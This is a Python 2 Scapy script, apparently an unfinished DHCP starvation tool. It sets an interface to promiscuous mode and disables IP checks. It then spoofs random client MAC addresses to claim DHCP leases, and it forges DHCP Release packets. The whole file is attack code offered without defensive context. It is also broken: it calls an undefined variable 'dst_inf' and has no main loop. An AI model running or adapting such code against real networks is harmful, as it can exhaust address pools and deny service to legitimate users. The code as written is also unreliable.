import subprocess
import sys
import logging
import random

# This will suppress all messages while running or loading scapy

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.interactive").setLevel(logging.ERROR)
logging.getLogger("scapy.loading").setLevel(logging.ERROR)

try:
    from scapy.all import *
except ImportError:
    print "Scapy package is not installed on your system."
    sys.exit()

# Put the interface in promiscous mode
net_iface = raw_input("Enter the interface to the target network: ")
subprocess.call(['ifconfig', net_iface, 'promisc'], stdout=None, stderr=None, shell=False)
print "\n Now interface %s is in promiscous mode\n" %net_iface

# To disable scapy's setting of checking IP addresses

conf.checkIPaddr = False

# DHCP packets
# There are 4 types of DHCP packets: Discover, Offer, Request, Acknowledgement

def generate_client_packets():

    all_ip_addr = []
    client_mac_addr = []
    server_ip_addr = []

    x_id = random.randrange(1, 100000)  #x_id = transaction number, random identifier for single DHCP transaction
    cli_mac = '00:15' + str(RandMAC())[5:]
    str_cli_mac = mac2str(cli_mac)

    # DHCP discover packet
    discover_pkt = Ether(src = cli_mac, dst = 'ff:ff:ff:ff:ff:ff') / IP(src='0.0.0.0', dst='255.255.255.255') / UDP(sport=68, dport=67) / BOOTP(op=1, xid=x_id, chaddr=str_cli_mac) / DHCP(options=[('message-type', 'discover'),('end')])

    # Send DHCP packet and receive Offer packet using srp() function
    # It will return one list with two tuples, one contains Discover packet and other contains offer packet

    discover_list, offer_list = srp(discover_pkt, iface=dst_inf, timeout=2, verbose=0)

    ip_addr_offered = discover_list[0][1][BOOTP].yiaddr

    # DHCP request packet
    request_pkt = Ether(src=cli_mac, dst='ff:ff:ff:ff:ff:ff') / IP(src='0.0.0.0', dst='255.255.255.255') / UDP(sport=68, dport=67) / BOOTP(op=1, xid=x_id, chaddr=str_cli_mac) / DHCP(options=[('message-type', 'request'), ('requested_addr', ip_addr_offered), ('end')])

    # Sending request packet and receive Ack packet

    request_list, ack_list = srp(request_pkt, iface=dst_inf, timeout=2, verbose=2)

    ip_addr_offered_ack = request_list[0][1][BOOTP].yiaddr

    server_ip = request_list[0][1][IP].src

    all_ip_addr.append(ip_addr_offered_ack)
    client_mac_addr.append(cli_mac)
    server_ip_addr.append(server_ip)

    return all_ip_addr, client_mac_addr, server_ip_addr


def generate_release_packet(ip, cli_mac, server):
    x_id = random.randrange(1, 100000)
    str_cli_mac = mac2str(cli_mac)

    release_pkt = IP(src=ip, dst=server) / UDP(sport=68, dport=67) / BOOTP(chaddr=str_cli_mac, ciaddr=ip, xid=x_id) / DHCP(options=[('message-type', 'release'), ('server_id', server), ('end')])
    send(release_pkt, verbose=0)





